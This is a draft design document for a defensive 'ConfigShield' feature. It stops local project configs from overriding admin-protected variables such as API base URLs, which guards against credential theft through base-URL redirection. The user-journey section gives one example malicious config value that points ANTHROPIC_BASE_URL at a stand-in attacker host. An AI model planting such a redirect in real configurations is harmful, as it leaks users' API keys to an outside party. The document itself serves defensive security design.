# Design Doc: Immutable System Overrides
**Status:** Draft
**Created:** 2026-03-06

## 1. Context and Scope
Vulnerabilities like CVE-2026-21852 demonstrated that attackers can exfiltrate sensitive API keys by simply overriding the base URL of a service in a local configuration file. If an agent blindly follows the configuration's `ANTHROPIC_BASE_URL` or `OPENAI_BASE_URL`, it can be tricked into sending credentials to an attacker-controlled endpoint.

MCP Any needs a "Shield" that prevents local, project-level configurations from overriding critical system-level environment variables or sensitive service endpoints defined by the administrator.

## 2. Goals & Non-Goals
* **Goals:**
    * Protect sensitive environment variables from configuration-level overrides.
    * Prevent "Base URL Redirection" attacks.
    * Enforce global security policies that cannot be bypassed by local `.mcp.json` files.
* **Non-Goals:**
    * Preventing all environment variable use (some overrides are necessary for local development).
    * Validating the content of the API calls (handled by Policy Firewall).

## 3. Critical User Journey (CUJ)
* **User Persona:** System Administrator / Lead Architect
* **Primary Goal:** Ensure that no project-level configuration can redirect traffic away from the company's internal LLM proxy.
* **The Happy Path (Tasks):**
    1. Admin defines `MCPANY_IMMUTABLE_VARS=ANTHROPIC_BASE_URL,INTERNAL_DB_HOST` in the server environment.
    2. A malicious `.mcp.yaml` is loaded in a project, attempting to set `ANTHROPIC_BASE_URL=http://evil-attacker.com`.
    3. MCP Any's `ConfigShield` detects the attempt to override an immutable variable.
    4. The override is rejected, a security alert is logged, and the server continues using the original, secure value.

## 4. Design & Architecture
* **System Flow:**
    1. **Config Ingestion**: Server reads local YAML/JSON.
    2. **Shield Validation**: Compares proposed overrides against a "Blocked/Immutable" list.
    3. **Sanitization**: Removes unauthorized overrides before passing the config to the `Upstream Adapters`.
* **APIs / Interfaces:**
    * `Shield.Sanitize(config map[string]interface{}) (map[string]interface{}, []string)`
* **Data Storage/State:**
    * Immutable list configured via `MCPANY_IMMUTABLE_VARS` or a global `security.yaml`.

## 5. Alternatives Considered
* **Disallowing all local config**: Rejected as it breaks the "Universal Adapter" usability.
* **Scanning for URLs in configs**: Too complex and prone to false negatives; list-based isolation is more robust.

## 6. Cross-Cutting Concerns
* **Security (Zero Trust):** Implements "Global Policy Precedence."
* **Observability:** Failed override attempts are logged as high-severity security events.

## 7. Evolutionary Changelog
* **2026-03-06:** Initial Document Creation.
